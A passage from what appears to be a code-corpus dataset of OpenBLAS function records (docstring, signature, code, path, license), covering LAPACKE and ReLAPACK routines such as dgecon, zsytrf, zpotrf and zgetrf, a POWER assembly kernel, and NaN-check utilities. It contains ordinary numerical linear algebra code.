A\", n, n, a, lda );\n        /* Print Right Rand Side */\n        print_matrix( \"Right Rand Side\", n, nrhs, b, ldb );\n        printf( \"\\n\" );\n        /* Executable statements */\n        printf( \"LAPACKE_dgecon Example Program Results\\n\" );\n        aNorm = LAPACKE_dlange(LAPACK_ROW_MAJOR, ONE_NORM, NROWS, NCOLS, a, LEADING_DIMENSION_A);\n        info = LAPACKE_dgetrf(LAPACK_ROW_MAJOR, NROWS, NCOLS, a, LEADING_DIMENSION_A, ipiv);\n        info = LAPACKE_dgecon(LAPACK_ROW_MAJOR, ONE_NORM, n, a, LEADING_DIMENSION_A, aNorm, &rcond); // aNorm should be 35.019999999999996\n        double work[4*N];\n        int iwork[N];\n        //info = LAPACKE_dgecon_work(LAPACK_ROW_MAJOR, ONE_NORM, n, a, LEADING_DIMENSION_A, aNorm, &rcond, work, iwork); // aNorm should be 35.019999999999996\n        //dgecon_( &ONE_NORM, &n, a, &LEADING_DIMENSION_A, &aNorm, &rcond, work, iwork, &info );\n        /* Check for the exact singularity */\n              if (info == 0)\n              {\n                     printf(\"LAPACKE_dgecon completed SUCCESSFULLY...\\n\");\n              }\n              else if ( info < 0 )\n              {\n            printf( \"Element %d of A had an illegal value\\n\", -info );\n            exit( 1 );\n        }\n              else\n              {\n            printf( \"Unrecognized value of INFO = %d\\n\", info );\n            exit( 1 );\n              }\n\n        /* Print solution */\n       printf(\"LAPACKE_dlange / One-norm of A = %lf\\n\", aNorm);\n        printf(\"LAPACKE_dgecon / RCOND of A    = %f\\n\", rcond);\n        exit( 0 );\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/example/example_user.c", "commit_date": "2017-01-06 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** zsytrf's recursive compute kernel */\n", "func_signal": "static void RELAPACK_zsytrf_rec(\n    const char *uplo, const blasint *n_full, const blasint *n, blasint *n_out,\n    double *A, const blasint *ldA, blasint *ipiv,\n    double *Work, const blasint *ldWork, blasint *info\n)", "code": "{\n\n    // top recursion level?\n    const blasint top = *n_full == *n;\n\n    if (*n <= MAX(CROSSOVER_ZSYTRF, 3)) {\n        // Unblocked\n        if (top) {\n            LAPACK(zsytf2)(uplo, n, A, ldA, ipiv, info);\n            *n_out = *n;\n        } else\n            RELAPACK_zsytrf_rec2(uplo, n_full, n, n_out, A, ldA, ipiv, Work, ldWork, info);\n        return;\n    }\n\n    blasint info1, info2;\n\n    // Constants\n    const double ONE[]  = { 1., 0. };\n    const double MONE[] = { -1., 0. };\n    const blasint    iONE[] = { 1 };\n\n    // Loop iterator\n    blasint i;\n\n    const blasint n_rest = *n_full - *n;\n\n    if (*uplo == 'L') {\n        // Splitting (setup)\n        blasint n1 = ZREC_SPLIT(*n);\n        blasint n2 = *n - n1;\n\n        // Work_L *\n        double *const Work_L = Work;\n\n        // recursion(A_L)\n        blasint n1_out;\n        RELAPACK_zsytrf_rec(uplo, n_full, &n1, &n1_out, A, ldA, ipiv, Work_L, ldWork, &info1);\n        n1 = n1_out;\n\n        // Splitting (continued)\n        n2 = *n - n1;\n        const blasint n_full2 = *n_full - n1;\n\n        // *      *\n        // A_BL   A_BR\n        // A_BL_B A_BR_B\n        double *const A_BL   = A                 + 2 * n1;\n        double *const A_BR   = A + 2 * *ldA * n1 + 2 * n1;\n        double *const A_BL_B = A                 + 2 * *n;\n        double *const A_BR_B = A + 2 * *ldA * n1 + 2 * *n;\n\n        // *        *\n        // Work_BL Work_BR\n        // *       *\n        // (top recursion level: use Work as Work_BR)\n        double *const Work_BL =              Work                    + 2 * n1;\n        double *const Work_BR = top ? Work : Work + 2 * *ldWork * n1 + 2 * n1;\n        const blasint ldWork_BR = top ? n2 : *ldWork;\n\n        // ipiv_T\n        // ipiv_B\n        blasint *const ipiv_B = ipiv + n1;\n\n        // A_BR = A_BR - A_BL Work_BL'\n        RELAPACK_zgemmt(uplo, \"N\", \"T\", &n2, &n1, MONE, A_BL, ldA, Work_BL, ldWork, ONE, A_BR, ldA);\n        BLAS(zgemm)(\"N\", \"T\", &n_rest, &n2, &n1, MONE, A_BL_B, ldA, Work_BL, ldWork, ONE, A_BR_B, ldA);\n\n        // recursion(A_BR)\n        blasint n2_out;\n        RELAPACK_zsytrf_rec(uplo, &n_full2, &n2, &n2_out, A_BR, ldA, ipiv_B, Work_BR, &ldWork_BR, &info2);\n\n        if (n2_out != n2) {\n            // undo 1 column of updates\n            const blasint n_restp1 = n_rest + 1;\n\n            // last column of A_BR\n            double *const A_BR_r = A_BR + 2 * *ldA * n2_out + 2 * n2_out;\n\n            // last row of A_BL\n            double *const A_BL_b = A_BL + 2 * n2_out;\n\n            // last row of Work_BL\n            double *const Work_BL_b = Work_BL + 2 * n2_out;\n\n            // A_BR_r = A_BR_r + A_BL_b Work_BL_b'\n            BLAS(zgemv)(\"N\", &n_restp1, &n1, ONE, A_BL_b, ldA, Work_BL_b, ldWork, ONE, A_BR_r, iONE);\n        }\n        n2 = n2_out;\n\n        // shift pivots\n        for (i = 0; i < n2; i++)\n            if (ipiv_B[i] > 0)\n                ipiv_B[i] += n1;\n            else\n                ipiv_B[i] -= n1;\n\n        *info  = info1 || info2;\n        *n_out = n1 + n2;\n    } else {\n        // Splitting (setup)\n        blasint n2 = ZREC_SPLIT(*n);\n        blasint n1 = *n - n2;\n\n        // * Work_R\n        // (top recursion level: use Work as Work_R)\n        double *const Work_R = top ? Work : Work + 2 * *ldWork * n1;\n\n        // recursion(A_R)\n        blasint n2_out;\n        RELAPACK_zsytrf_rec(uplo, n_full, &n2, &n2_out, A, ldA, ipiv, Work_R, ldWork, &info2);\n        const blasint n2_diff = n2 - n2_out;\n        n2 = n2_out;\n\n        // Splitting (continued)\n        n1 = *n - n2;\n        const blasint n_full1  = *n_full - n2;\n\n        // * A_TL_T A_TR_T\n        // * A_TL   A_TR\n        // * *      *\n        double *const A_TL_T = A + 2 * *ldA * n_rest;\n        double *const A_TR_T = A + 2 * *ldA * (n_rest + n1);\n        double *const A_TL   = A + 2 * *ldA * n_rest        + 2 * n_rest;\n        double *const A_TR   = A + 2 * *ldA * (n_rest + n1) + 2 * n_rest;\n\n        // Work_L *\n        // *      Work_TR\n        // *      *\n        // (top recursion level: Work_R was Work)\n        double *const Work_L  = Work;\n        double *const Work_TR = Work + 2 * *ldWork * (top ? n2_diff : n1) + 2 * n_rest;\n        const blasint ldWork_L = top ? n1 : *ldWork;\n\n        // A_TL = A_TL - A_TR Work_TR'\n        RELAPACK_zgemmt(uplo, \"N\", \"T\", &n1, &n2, MONE, A_TR, ldA, Work_TR, ldWork, ONE, A_TL, ldA);\n        BLAS(zgemm)(\"N\", \"T\", &n_rest, &n1, &n2, MONE, A_TR_T, ldA, Work_TR, ldWork, ONE, A_TL_T, ldA);\n\n        // recursion(A_TL)\n        blasint n1_out;\n        RELAPACK_zsytrf_rec(uplo, &n_full1, &n1, &n1_out, A, ldA, ipiv, Work_L, &ldWork_L, &info1);\n\n        if (n1_out != n1) {\n            // undo 1 column of updates\n            const blasint n_restp1 = n_rest + 1;\n\n            // A_TL_T_l = A_TL_T_l + A_TR_T Work_TR_t'\n            BLAS(zgemv)(\"N\", &n_restp1, &n2, ONE, A_TR_T, ldA, Work_TR, ldWork, ONE, A_TL_T, iONE);\n        }\n        n1 = n1_out;\n\n        *info  = info2 || info1;\n        *n_out = n1 + n2;\n    }\n}", "path": "OpenBLAS/relapack/src/zsytrf.c", "commit_date": "2020-08-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** ZSYTRF computes the factorization of a complex symmetric matrix A using the Bunch-Kaufman diagonal pivoting method.\n *\n * This routine is functionally equivalent to LAPACK's zsytrf.\n * For details on its interface, see\n * http://www.netlib.org/lapack/explore-html/da/d94/zsytrf_8f.html\n * */\n", "func_signal": "void RELAPACK_zsytrf(\n    const char *uplo, const blasint *n,\n    double *A, const blasint *ldA, blasint *ipiv,\n    double *Work, const blasint *lWork, blasint *info\n)", "code": "{\n\n    // Required work size\n    const blasint cleanlWork = *n * (*n / 2);\n    blasint minlWork = cleanlWork;\n#if XSYTRF_ALLOW_MALLOC\n    minlWork = 1;\n#endif\n\n    // Check arguments\n    const blasint lower = LAPACK(lsame)(uplo, \"L\");\n    const blasint upper = LAPACK(lsame)(uplo, \"U\");\n    *info = 0;\n    if (!lower && !upper)\n        *info = -1;\n    else if (*n < 0)\n        *info = -2;\n    else if (*ldA < MAX(1, *n))\n        *info = -4;\n    else if ((*lWork < 1 || *lWork < minlWork) && *lWork != -1)\n        *info = -7;\n    else if (*lWork == -1) {\n        // Work size query\n        *Work = cleanlWork;\n        return;\n    }\n\n    // Ensure Work size\n    double *cleanWork = Work;\n#if XSYTRF_ALLOW_MALLOC\n    if (!*info && *lWork < cleanlWork) {\n        cleanWork = malloc(cleanlWork * 2 * sizeof(double));\n        if (!cleanWork)\n            *info = -7;\n    }\n#endif\n\n    if (*info) {\n        const blasint minfo = -*info;\n        LAPACK(xerbla)(\"ZSYTRF\", &minfo, strlen(\"ZSYTRF\"));\n        return;\n    }\n\n    // Clean char * arguments\n    const char cleanuplo = lower ? 'L' : 'U';\n\n    // Dummy arguments\n    blasint nout;\n\n    // Recursive kernel\n    if (*n != 0)\n    RELAPACK_zsytrf_rec(&cleanuplo, n, n, &nout, A, ldA, ipiv, cleanWork, n, info);\n\n#if XSYTRF_ALLOW_MALLOC\n    if (cleanWork != Work)\n        free(cleanWork);\n#endif\n}", "path": "OpenBLAS/relapack/src/zsytrf.c", "commit_date": "2020-08-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** ZPOTRF computes the Cholesky factorization of a complex Hermitian positive definite matrix A.\n *\n * This routine is functionally equivalent to LAPACK's zpotrf.\n * For details on its interface, see\n * http://www.netlib.org/lapack/explore-html/d1/db9/zpotrf_8f.html\n * */\n", "func_signal": "void RELAPACK_zpotrf(\n    const char *uplo, const blasint *n,\n    double *A, const blasint *ldA,\n    blasint *info\n)", "code": "{\n\n    // Check arguments\n    const blasint lower = LAPACK(lsame)(uplo, \"L\");\n    const blasint upper = LAPACK(lsame)(uplo, \"U\");\n    *info = 0;\n    if (!lower && !upper)\n        *info = -1;\n    else if (*n < 0)\n        *info = -2;\n    else if (*ldA < MAX(1, *n))\n        *info = -4;\n    if (*info) {\n        const blasint minfo = -*info;\n        LAPACK(xerbla)(\"ZPOTRF\", &minfo, strlen(\"ZPOTRF\"));\n        return;\n    }\n\n    // Clean char * arguments\n    const char cleanuplo = lower ? 'L' : 'U';\n\n    // Recursive kernel\n    RELAPACK_zpotrf_rec(&cleanuplo, n, A, ldA, info);\n}", "path": "OpenBLAS/relapack/src/zpotrf.c", "commit_date": "2019-04-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/**\n * Find  minimum index \n * Warning: requirements n>0  and n % 16 == 0\n * @param n     \n * @param x     pointer to the vector\n * @param minf  (out) minimum absolute value .( only for output )\n * @return minimum index \n */\n", "func_signal": "static BLASLONG ziamin_kernel_16_TUNED(BLASLONG n, FLOAT *x, FLOAT *minf)", "code": "{ \n\n    BLASLONG index;\n    register __vector long long start = {1,0};\n    register __vector long long temp_add_index = {2, 2}; \n   __asm__(\n\n            \"lxvd2x  44,      0,%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  45, %[i16],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  46, %[i32],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  47, %[i48],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  48, %[i64],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  49, %[i80],%[ptr_tmp] \\n\\t\"  \n            \"lxvd2x  6, %[i96],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  7,%[i112],%[ptr_tmp] \\n\\t\"      \n\n            \"xxlor  40,%x[start],%x[start]  \\n\\t\" //{ 1,0} vs40 | v8 \n            \"vaddudm  9,8,%[adder]   \\n\\t\" //{3,2} vs41 \n            \"xxlxor  37,37 ,37       \\n\\t\" //v5 v37 index_count\n            \"vaddudm  10,9,%[adder]  \\n\\t\" //{5,4} vs42\n            \"xxlxor  38 ,38 ,38      \\n\\t\"  // v6 | vs38 vec_min_index\n            \"vaddudm  11,10,%[adder] \\n\\t\" //{7,6} vs43\n            \"lxvdsx  39,0,%[ptr_minf] \\n\\t\" //   vs39 vec_min_value\n            \"vaddudm 4,11,  %[adder] \\n\\t\" // {9,8} -{8;8} vs36 | v4\n            XXSPLTD_S(36,36,0)\n\n\n\n            \"xvabsdp  44, 44 \\n\\t\"\n            \"xvabsdp  45, 45 \\n\\t\" \n            \"xvabsdp  46, 46 \\n\\t\"\n            \"xvabsdp  47, 47 \\n\\t\"   \n            \"xvabsdp  48, 48 \\n\\t\"\n            \"xvabsdp  49, 49 \\n\\t\"   \n            \"xvabsdp  6, 6 \\n\\t\"\n            \"xvabsdp  7, 7 \\n\\t\"\n\n            //jump first half forward \n            \"b two%=  \\n\\t\"\n\n            \".align   5            \\n\\t\"\n            \"one%=: \\n\\t\"\n\n \n            XXMRGHD_S(0,44,45)\n            XXMRGLD_S(1,44,45)\n            XXMRGHD_S(2,46,47)\n            XXMRGLD_S(3,46,47)\n            XXMRGHD_S(4,48,49)\n            XXMRGLD_S(5,48,49)\n            XXMRGHD_S(44,6,7)\n            XXMRGLD_S(45,6,7)\n\n            \"xvadddp    46,  0,1 \\n\\t\"\n            \"xvadddp    47,  2,3 \\n\\t\" \n            \"xvadddp    48,  4,5 \\n\\t\"\n            \"xvadddp    49,  44,45 \\n\\t\"\n\n\n\n            \"xvcmpgtdp  6,46,47  \\n\\t \"\n            \"xvcmpgtdp  7,48,49  \\n\\t \"\n\n            \"addi     %[ptr_tmp] ,%[ptr_tmp] , 128 \\n\\t\"   \n\n            \"xxsel    32,40,41,6 \\n\\t\"\n            \"xxsel     0,46,47,6 \\n\\t\" \n            \"xxsel    33,42,43,7 \\n\\t\"\n            \"xxsel     1,48,49,7 \\n\\t\"  \n\n            \"lxvd2x  44,      0,%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  45, %[i16],%[ptr_tmp] \\n\\t\"\n\n            \"xvcmpgtdp  2,0,1  \\n\\t \"             \n            \"lxvd2x  46, %[i32],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  47, %[i48],%[ptr_tmp] \\n\\t\"\n\n\n            \"xxsel    32,32,33,2 \\n\\t\" \n            \"xxsel    3,0,1,2 \\n\\t\" \n     \n            \"vaddudm   0,0,5       \\n\\t\"\n\n             //cmp with previous\n\n            \"xvcmpgtdp 4,39,3     \\n\\t \"  \n            \"vaddudm   5,5,4      \\n\\t\"     \n\n            \"lxvd2x  48, %[i64],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  49, %[i80],%[ptr_tmp] \\n\\t\"  \n            \"lxvd2x  6, %[i96],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  7,%[i112],%[ptr_tmp] \\n\\t\"        \n             //select with previous \n            \"xxsel     38,38,32,4 \\n\\t\" \n            \"xxsel    39,39,3,4    \\n\\t\" \n\n\n\n\n            \"xvabsdp  44, 44 \\n\\t\"\n            \"xvabsdp  45, 45 \\n\\t\" \n            \"xvabsdp  46, 46 \\n\\t\"\n            \"xvabsdp  47, 47 \\n\\t\"   \n            \"xvabsdp  48, 48 \\n\\t\"\n            \"xvabsdp  49, 49 \\n\\t\"   \n            \"xvabsdp  6, 6 \\n\\t\"\n            \"xvabsdp  7, 7 \\n\\t\"\n\n\n//>>///////////////////////////////  half start\n            \"two%=:   \\n\\t\"\n            XXMRGHD_S(0,44,45)\n            XXMRGLD_S(1,44,45)\n            XXMRGHD_S(2,46,47)\n            XXMRGLD_S(3,46,47)\n            XXMRGHD_S(4,48,49)\n            XXMRGLD_S(5,48,49)\n            XXMRGHD_S(44,6,7)\n            XXMRGLD_S(45,6,7)\n\n            \"xvadddp    46,  0,1 \\n\\t\"\n            \"xvadddp    47,  2,3 \\n\\t\" \n            \"xvadddp    48,  4,5 \\n\\t\"\n            \"xvadddp    49,  44,45 \\n\\t\"\n\n            \"xvcmpgtdp  6,46,47  \\n\\t \"\n            \"xvcmpgtdp  7,48,49  \\n\\t \"\n\n            \"addi     %[ptr_tmp] ,%[ptr_tmp] , 128 \\n\\t\"   \n\n            \"xxsel    32,40,41,6 \\n\\t\"\n            \"xxsel     0,46,47,6 \\n\\t\" \n            \"xxsel    33,42,43,7 \\n\\t\"\n            \"xxsel     1,48,49,7 \\n\\t\"  \n\n            \"lxvd2x  44,      0,%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  45, %[i16],%[ptr_tmp] \\n\\t\"\n\n            \"xvcmpgtdp  2,0,1  \\n\\t \"             \n            \"lxvd2x  46, %[i32],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  47, %[i48],%[ptr_tmp] \\n\\t\"\n\n\n            \"xxsel    32,32,33,2 \\n\\t\" \n            \"xxsel    3,0,1,2 \\n\\t\" \n     \n            \"vaddudm   0,0,5       \\n\\t\"\n\n             //cmp with previous\n\n            \"xvcmpgtdp 4,39,3     \\n\\t \"  \n            \"vaddudm   5,5,4      \\n\\t\"     \n\n            \"lxvd2x  48, %[i64],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  49, %[i80],%[ptr_tmp] \\n\\t\"  \n            \"lxvd2x  6, %[i96],%[ptr_tmp] \\n\\t\"\n            \"lxvd2x  7,%[i112],%[ptr_tmp] \\n\\t\"        \n             //select with previous \n            \"xxsel     38,38,32,4 \\n\\t\" \n            \"xxsel    39,39,3,4    \\n\\t\" \n \n\n            \"xvabsdp  44, 44 \\n\\t\"\n            \"xvabsdp  45, 45 \\n\\t\" \n            \"xvabsdp  46, 46 \\n\\t\"\n            \"xvabsdp  47, 47 \\n\\t\"   \n            \"xvabsdp  48, 48 \\n\\t\"\n            \"xvabsdp  49, 49 \\n\\t\"   \n            \"xvabsdp  6, 6 \\n\\t\"\n            \"xvabsdp  7, 7 \\n\\t\"\n\n\n            //decrement n\n            \"addic.    %[n], %[n], -16 \\n\\t\"\n            //Loop back if >0\n            \"bgt+ one%=  \\n\\t\"\n\n\n            XXMRGHD_S(0,44,45)\n            XXMRGLD_S(1,44,45)\n            XXMRGHD_S(2,46,47)\n            XXMRGLD_S(3,46,47)\n            XXMRGHD_S(4,48,49)\n            XXMRGLD_S(5,48,49)\n            XXMRGHD_S(44,6,7)\n            XXMRGLD_S(45,6,7)\n\n            \"xvadddp    46,  0,1 \\n\\t\"\n            \"xvadddp    47,  2,3 \\n\\t\" \n            \"xvadddp    48,  4,5 \\n\\t\"\n            \"xvadddp    49,  44,45 \\n\\t\"\n\n\n\n            \"xvcmpgtdp  6,46,47  \\n\\t \"\n            \"xvcmpgtdp  7,48,49  \\n\\t \"\n\n            \"xxsel    32,40,41,6 \\n\\t\"\n            \"xxsel     0,46,47,6 \\n\\t\" \n            \"xxsel    33,42,43,7 \\n\\t\"\n            \"xxsel     1,48,49,7 \\n\\t\"  \n\n            \"xvcmpgtdp  2,0,1  \\n\\t \" \n            \"xxsel    32,32,33,2 \\n\\t\" \n            \"xxsel    3,0,1,2 \\n\\t\" \n     \n            \"vaddudm   0,0,5       \\n\\t\"\n\n            \"addi     %[ptr_tmp] ,%[ptr_tmp] , 128 \\n\\t\"            \n             //cmp with previous\n\n            \"xvcmpgtdp 4,39,3     \\n\\t \"  \n            \"vaddudm   5,5,4      \\n\\t\"     \n            \"xxsel     38,38,32,4 \\n\\t\" \n            \"xxsel    39,39,3,4    \\n\\t\" \n\n\n            ///////extract min value and min index from vector\n\n            XXSPLTD_S(32,38,1)\n            XXSPLTD_S(40,39,1)\n            \"xvcmpeqdp.  2, 40,39  \\n\\t\"\n    \n            //cr6 0 bit set if all true, cr6=4*6+bit_ind=24,0011at CR(BI)==1, at=10 hint that it occurs rarely\n             //0b001110=14\n            \"bc 14,24, three%=  \\n\\t\" \n            \"xvcmpgtdp  4,39, 40  \\n\\t\"\n            \"xxsel    0,39,40,4           \\n\\t\"\n            \"xxsel    1,38,32,4  \\n\\t\"\n            \"stxsdx    0,0,%[ptr_minf]     \\n\\t\" \n            \"b four%=    \\n\\t\"\n\n            \"three%=:      \\n\\t\" \n                //if elements value are equal then choose minimum index\n            XXSPLTD_S(0,40,0)\n            \"vminud   0,0,6    \\n\\t\"  //vs32 vs38\n            \"xxlor 1,32,32     \\n\\t\"\n            \"stxsdx   0,0,%[ptr_minf]  \\n\\t\"\n          \n\n            \"four%=:      \\n\\t\"\n            \"mfvsrd   %[index],1 \\n\\t\"\n\n            : [minf] \"=m\"(*minf),[ptr_tmp] \"+&b\"(x),[index] \"=r\"(index), [n] \"+&r\"(n)\n            : [mem] \"m\"(*(const double (*)[2*n])x), [ptr_x] \"b\"(x), [ptr_minf] \"b\"(minf) ,\n            [i16] \"b\"(16), [i32] \"b\"(32), [i48] \"b\"(48),\n            [i64] \"b\"(64), [i80] \"b\"(80), [i96] \"b\"(96), [i112] \"b\"(112),\n            [start] \"v\"(start),  [adder] \"v\"(temp_add_index)\n            : \"cc\", \"vs0\", \"vs1\",\"vs2\",\"vs3\", \"vs4\",\"vs5\",\"vs32\", \"vs33\", \"vs34\", \"vs35\", \"vs36\",\n            \"vs37\", \"vs38\", \"vs39\", \"vs40\", \"vs41\", \"vs42\", \"vs43\", \"vs44\", \"vs45\", \"vs46\", \"vs47\", \"vs48\", \"vs49\", \"vs6\", \"vs7\"\n            );\n \n    return index; \n}", "path": "OpenBLAS/kernel/power/izamin.c", "commit_date": "2020-07-23 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Check a matrix for NaN entries.\n * Since matrix in packed format stored continuously it just required to\n * check 1d array for NaNs. It doesn't depend upon uplo or matrix_layout.\n */\n", "func_signal": "lapack_logical LAPACKE_stp_nancheck( int matrix_layout, char uplo, char diag,\n                                      lapack_int n,\n                                      const float *ap )", "code": "{\n    lapack_int i, len;\n    lapack_logical colmaj, upper, unit;\n\n    if( ap == NULL ) return (lapack_logical) 0;\n\n    colmaj = ( matrix_layout == LAPACK_COL_MAJOR );\n    upper  = LAPACKE_lsame( uplo, 'u' );\n    unit   = LAPACKE_lsame( diag, 'u' );\n\n    if( ( !colmaj && ( matrix_layout != LAPACK_ROW_MAJOR ) ) ||\n        ( !upper  && !LAPACKE_lsame( uplo, 'l' ) ) ||\n        ( !unit   && !LAPACKE_lsame( diag, 'n' ) ) ) {\n        /* Just exit if any of input parameters are wrong */\n        return (lapack_logical) 0;\n    }\n\n    if( unit ) {\n        /* Unit case, diagonal should be excluded from the check for NaN. */\n\n        /* Since col_major upper and row_major lower are equal,\n         * and col_major lower and row_major upper are equals too -\n         * using one code for equal cases. XOR( colmaj, upper )\n         */\n        if( ( colmaj || upper ) && !( colmaj && upper ) ) {\n            for( i = 1; i < n; i++ )\n                if( LAPACKE_s_nancheck( i, &ap[ ((size_t)i+1)*i/2 ], 1 ) )\n                    return (lapack_logical) 1;\n        } else {\n            for( i = 0; i < n-1; i++ )\n                if( LAPACKE_s_nancheck( n-i-1,\n                    &ap[ (size_t)i+1 + i*((size_t)2*n-i+1)/2 ], 1 ) )\n                    return (lapack_logical) 1;\n        }\n        return (lapack_logical) 0;\n    } else {\n        /* Non-unit case - just check whole array for NaNs. */\n        len = n*(n+1)/2;\n        return LAPACKE_s_nancheck( len, ap, 1 );\n    }\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/utils/lapacke_stp_nancheck.c", "commit_date": "2020-01-01 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Check a matrix for NaN entries. */\n", "func_signal": "lapack_logical LAPACKE_ztr_nancheck( int matrix_layout, char uplo, char diag,\n                                      lapack_int n,\n                                      const lapack_complex_double *a,\n                                      lapack_int lda )", "code": "{\n    lapack_int i, j, st;\n    lapack_logical colmaj, lower, unit;\n\n    if( a == NULL ) return (lapack_logical) 0;\n\n    colmaj = ( matrix_layout == LAPACK_COL_MAJOR );\n    lower  = LAPACKE_lsame( uplo, 'l' );\n    unit   = LAPACKE_lsame( diag, 'u' );\n\n    if( ( !colmaj && ( matrix_layout != LAPACK_ROW_MAJOR ) ) ||\n        ( !lower  && !LAPACKE_lsame( uplo, 'u' ) ) ||\n        ( !unit   && !LAPACKE_lsame( diag, 'n' ) ) ) {\n        /* Just exit if any of input parameters are wrong */\n        return (lapack_logical) 0;\n    }\n    if( unit ) {\n        /* If unit, then don't touch diagonal, start from 1st column or row */\n        st = 1;\n    } else  {\n        /* If non-unit, then check diagonal also, starting from [0,0] */\n        st = 0;\n    }\n\n    /* Since col_major upper and row_major lower are equal,\n     * and col_major lower and row_major upper are equals too -\n     * using one code for equal cases. XOR( colmaj, upper )\n     */\n    if( ( colmaj || lower ) && !( colmaj && lower ) ) {\n        for( j = st; j < n; j++ ) {\n            for( i = 0; i < MIN( j+1-st, lda ); i++ ) {\n                if( LAPACK_ZISNAN( a[i+j*lda] ) )\n                    return (lapack_logical) 1;\n            }\n        }\n    } else {\n        for( j = 0; j < n-st; j++ ) {\n            for( i = j+st; i < MIN( n, lda ); i++ ) {\n                if( LAPACK_ZISNAN( a[i+j*lda] ) )\n                    return (lapack_logical) 1;\n            }\n        }\n    }\n    return (lapack_logical) 0;\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/utils/lapacke_ztr_nancheck.c", "commit_date": "2015-11-20 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** ZGETRF computes an LU factorization of a general M-by-N matrix A using partial pivoting with row interchanges.\n *\n * This routine is functionally equivalent to LAPACK's zgetrf.\n * For details on its interface, see\n * http://www.netlib.org/lapack/explore-html/dd/dd1/zgetrf_8f.html\n * */\n", "func_signal": "void RELAPACK_zgetrf(\n    const blasint *m, const blasint *n,\n    double *A, const blasint *ldA, blasint *ipiv,\n    blasint *info\n)", "code": "{\n\n    // Check arguments\n    *info = 0;\n    if (*m < 0)\n        *info = -1;\n    else if (*n < 0)\n        *info = -2;\n    else if (*ldA < MAX(1, *m))\n        *info = -4;\n    if (*info) {\n        const blasint minfo = -*info;\n        LAPACK(xerbla)(\"ZGETRF\", &minfo, strlen(\"ZGETRF\"));\n        return;\n    }\n\n    if (*m == 0 || *n == 0) return;\n    const blasint sn = MIN(*m, *n);\n\n    RELAPACK_zgetrf_rec(m, &sn, A, ldA, ipiv, info);\n\n    // Right remainder\n    if (*m < *n) {\n        // Constants\n        const double ONE[]  = { 1., 0. };\n        const blasint    iONE[] = { 1 };\n\n        // Splitting\n        const blasint rn = *n - *m;\n\n        // A_L A_R\n        const double *const A_L = A;\n        double *const       A_R = A + 2 * *ldA * *m;\n\n        // A_R = apply(ipiv, A_R)\n        LAPACK(zlaswp)(&rn, A_R, ldA, iONE, m, ipiv, iONE);\n        // A_R = A_L \\ A_R\n        BLAS(ztrsm)(\"L\", \"L\", \"N\", \"U\", m, &rn, ONE, A_L, ldA, A_R, ldA);\n    }\n}", "path": "OpenBLAS/relapack/src/zgetrf.c", "commit_date": "2020-08-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** zgetrf's recursive compute kernel */\n", "func_signal": "static void RELAPACK_zgetrf_rec(\n    const blasint *m, const blasint *n,\n    double *A, const blasint *ldA, blasint *ipiv,\n    blasint *info\n)", "code": "{\n\n    if (*m == 0 || *n == 0) return;\n\n    if ( *n <= MAX(CROSSOVER_ZGETRF, 1)) {\n        // Unblocked\n        LAPACK(zgetrf2)(m, n, A, ldA, ipiv, info);\n        return;\n    }\n\n    // Constants\n    const double ONE[]  = { 1., 0. };\n    const double MONE[] = { -1., 0. };\n    const blasint    iONE[] = { 1. };\n\n    // Splitting\n    const blasint n1 = ZREC_SPLIT(*n);\n    const blasint n2 = *n - n1;\n    const blasint m2 = *m - n1;\n\n    // A_L A_R\n    double *const A_L = A;\n    double *const A_R = A + 2 * *ldA * n1;\n\n    // A_TL A_TR\n    // A_BL A_BR\n    double *const A_TL = A;\n    double *const A_TR = A + 2 * *ldA * n1;\n    double *const A_BL = A                 + 2 * n1;\n    double *const A_BR = A + 2 * *ldA * n1 + 2 * n1;\n\n    // ipiv_T\n    // ipiv_B\n    blasint *const ipiv_T = ipiv;\n    blasint *const ipiv_B = ipiv + n1;\n\n    // recursion(A_L, ipiv_T)\n    RELAPACK_zgetrf_rec(m, &n1, A_L, ldA, ipiv_T, info);\nif (*info) return;\n\n    // apply pivots to A_R\n    LAPACK(zlaswp)(&n2, A_R, ldA, iONE, &n1, ipiv_T, iONE);\n\n    // A_TR = A_TL \\ A_TR\n    BLAS(ztrsm)(\"L\", \"L\", \"N\", \"U\", &n1, &n2, ONE, A_TL, ldA, A_TR, ldA);\n    // A_BR = A_BR - A_BL * A_TR\n    BLAS(zgemm)(\"N\", \"N\", &m2, &n2, &n1, MONE, A_BL, ldA, A_TR, ldA, ONE, A_BR, ldA);\n\n    // recursion(A_BR, ipiv_B)\n    RELAPACK_zgetrf_rec(&m2, &n2, A_BR, ldA, ipiv_B, info);\n    if (*info)\n        *info += n1;\n    // apply pivots to A_BL\n    LAPACK(zlaswp)(&n1, A_BL, ldA, iONE, &n2, 